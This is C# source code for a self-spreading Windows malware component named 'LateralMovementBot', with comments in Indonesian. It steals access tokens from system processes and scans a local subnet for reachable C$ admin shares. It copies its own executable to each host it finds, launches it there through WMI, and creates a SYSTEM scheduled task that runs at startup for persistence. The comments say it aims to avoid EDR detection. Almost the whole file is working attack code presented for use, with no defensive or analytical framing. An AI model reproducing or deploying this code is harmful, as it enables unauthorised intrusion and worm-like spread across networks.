using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Net.NetworkInformation;
using System.Linq;
using System.IO;
using System.Management;
using System.Text;
using System.Threading.Tasks;

namespace BlackNevra
{
    public class LateralMovementBot
    {
        public class MovementResult
        {
            public bool Success { get; set; }
            public string TargetIp { get; set; }
            public string Output { get; set; }
            public string ErrorMessage { get; set; }
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const uint TOKEN_DUPLICATE = 0x0002;
        private const uint TOKEN_IMPERSONATE = 0x0004;
        private const uint TOKEN_QUERY = 0x0008;
        private const int MAX_CONCURRENT_THREADS = 10; // Batas thread untuk efisiensi

        private static readonly string[] ProcessNames = { "explorer", "svchost", "winlogon" };

        /// <summary>
        /// Melakukan lateral movement ke sistem target menggunakan token impersonation.
        /// </summary>
        /// <param name="processId">ID proses untuk mencuri token.</param>
        /// <param name="targetIp">IP sistem target.</param>
        /// <param name="botPath">Path lokal bot executable.</param>
        /// <returns>Hasil lateral movement.</returns>
        public static async Task<MovementResult> PerformLateralMovement(int processId, string targetIp, string botPath)
        {
            var result = new MovementResult { TargetIp = targetIp };

            try
            {
                IntPtr hToken;
                var process = Process.GetProcessById(processId);
                if (!OpenProcessToken(process.Handle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, out hToken))
                {
                    result.ErrorMessage = $"Failed to open token for process {processId}: {Marshal.GetLastWin32Error()}";
                    return result;
                }

                try
                {
                    if (!ImpersonateLoggedOnUser(hToken))
                    {
                        result.ErrorMessage = $"Failed to impersonate token: {Marshal.GetLastWin32Error()}";
                        return result;
                    }

                    // Obfuscate string untuk path SMB
                    string botFileName = Path.GetFileName(botPath);
                    string targetBotPath = ObfuscatePath(targetIp, botFileName);

                    // Periksa apakah bot sudah ada di target
                    if (File.Exists(targetBotPath))
                    {
                        result.Success = true;
                        result.Output = $"Bot already exists at {targetBotPath} on {targetIp}. Skipping.";
                        return result;
                    }

                    // Salin bot ke share C$ di target
                    try
                    {
                        File.Copy(botPath, targetBotPath, true);
                        result.Output = $"Bot copied to {targetBotPath}.";
                    }
                    catch (Exception ex)
                    {
                        result.ErrorMessage = $"Failed to copy bot to {targetBotPath}: {ex.Message}";
                        return result;
                    }

                    // Jalankan bot di target menggunakan WMI
                    int retries = 2;
                    for (int i = 0; i <= retries; i++)
                    {
                        try
                        {
                            ConnectionOptions options = new ConnectionOptions
                            {
                                EnablePrivileges = true,
                                Authentication = AuthenticationLevel.PacketPrivacy
                            };

                            ManagementScope scope = new ManagementScope($"\\\\{targetIp}\\root\\cimv2", options);
                            scope.Connect();

                            ManagementPath path = new ManagementPath("Win32_Process");
                            ManagementClass processClass = new ManagementClass(scope, path, new ObjectGetOptions());

                            ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
                            inParams["CommandLine"] = targetBotPath;

                            ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
                            uint returnValue = (uint)outParams["ReturnValue"];
                            if (returnValue == 0)
                            {
                                result.Success = true;
                                result.Output += $"\nBot executed on {targetIp}.";

                                // Tambahkan scheduled task untuk persistensi
                                await CreateScheduledTask(targetIp, targetBotPath);
                                result.Output += $"\nScheduled task created on {targetIp}.";
                                break;
                            }
                            else
                            {
                                result.ErrorMessage = $"Failed to execute bot on {targetIp}. WMI error code: {returnValue}";
                            }
                        }
                        catch (Exception ex)
                        {
                            result.ErrorMessage = $"Failed to execute WMI on {targetIp}: {ex.Message}";
                            if (i == retries) break;
                            await Task.Delay(1000); // Tunggu sebelum retry
                        }
                    }

                    // Mengembalikan konteks ke pengguna asli
                    WindowsIdentity.Impersonate(IntPtr.Zero);
                }
                finally
                {
                    CloseHandle(hToken);
                }
            }
            catch (Exception ex)
            {
                result.ErrorMessage = $"Failed lateral movement to {targetIp}: {ex.Message}";
            }

            return result;
        }

        /// <summary>
        /// Membuat scheduled task di target untuk persistensi.
        /// </summary>
        private static async Task CreateScheduledTask(string targetIp, string botPath)
        {
            try
            {
                ConnectionOptions options = new ConnectionOptions
                {
                    EnablePrivileges = true,
                    Authentication = AuthenticationLevel.PacketPrivacy
                };

                ManagementScope scope = new ManagementScope($"\\\\{targetIp}\\root\\cimv2", options);
                scope.Connect();

                ManagementPath path = new ManagementPath("Win32_Process");
                ManagementClass processClass = new ManagementClass(scope, path, new ObjectGetOptions());

                ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
                inParams["CommandLine"] = $"schtasks /create /tn BotTask /tr \"{botPath}\" /sc onstart /ru SYSTEM /f";

                await Task.Run(() => processClass.InvokeMethod("Create", inParams, null));
            }
            catch
            {
                // Silent: Gagal membuat scheduled task tidak menghentikan proses
            }
        }

        /// <summary>
        /// Obfuscate path untuk menghindari deteksi EDR.
        /// </summary>
        private static string ObfuscatePath(string ip, string fileName)
        {
            return string.Concat(@"\\", ip, @"\C$\Windows\Temp\", fileName);
        }

        /// <summary>
        /// Mendeteksi sistem target di jaringan untuk lateral movement.
        /// </summary>
        /// <param name="subnet">Subnet jaringan (misalnya, "192.168.1").</param>
        /// <returns>Daftar IP sistem yang aktif.</returns>
        public static List<string> DiscoverNetworkTargets(string subnet)
        {
            var targets = new List<string>();
            try
            {
                for (int i = 1; i <= 254; i++)
                {
                    string ip = $"{subnet}.{i}";
                    Ping ping = new Ping();
                    PingReply reply = ping.Send(ip, 1000); // Timeout 1 detik
                    if (reply.Status == IPStatus.Success)
                    {
                        try
                        {
                            string sharePath = ObfuscatePath(ip, "test");
                            DirectoryInfo dir = new DirectoryInfo(Path.GetDirectoryName(sharePath));
                            if (dir.Exists)
                            {
                                targets.Add(ip);
                            }
                        }
                        catch
                        {
                            // Silent: Skip jika share tidak dapat diakses
                        }
                    }
                }
            }
            catch
            {
                // Silent: Gagal deteksi tidak menghentikan proses
            }

            return targets;
        }

        /// <summary>
        /// Menjalankan bot untuk lateral movement otomatis dengan multi-threading.
        /// </summary>
        /// <param name="subnet">Subnet jaringan (misalnya, "192.168.1").</param>
        /// <returns>Daftar hasil lateral movement.</returns>
        public static async Task<List<MovementResult>> RunBot(string subnet)
        {
            var results = new List<MovementResult>();
            try
            {
                // Dapatkan path bot executable secara dinamis
                string botPath = Process.GetCurrentProcess().MainModule.FileName;

                // Cari proses dengan token pengguna aktif
                int? processId = null;
                foreach (var name in ProcessNames)
                {
                    var processes = Process.GetProcessesByName(name);
                    if (processes.Length > 0)
                    {
                        processId = processes[0].Id;
                        break;
                    }
                }

                if (!processId.HasValue)
                {
                    results.Add(new MovementResult { ErrorMessage = "No suitable process found for token stealing." });
                    return results;
                }

                // Deteksi target di jaringan
                var targets = DiscoverNetworkTargets(subnet);
                if (targets.Count == 0)
                {
                    results.Add(new MovementResult { ErrorMessage = "No targets found in the network." });
                    return results;
                }

                // Lakukan lateral movement ke setiap target secara paralel
                var tasks = new List<Task<MovementResult>>();
                var semaphore = new System.Threading.SemaphoreSlim(MAX_CONCURRENT_THREADS);

                foreach (var targetIp in targets)
                {
                    await semaphore.WaitAsync();
                    tasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            return await PerformLateralMovement(processId.Value, targetIp, botPath);
                        }
                        finally
                        {
                            semaphore.Release();
                        }
                    }));
                }

                results.AddRange(await Task.WhenAll(tasks));
            }
            catch (Exception ex)
            {
                results.Add(new MovementResult { ErrorMessage = $"Bot execution failed: {ex.Message}" });
            }

            return results;
        }
    }
}
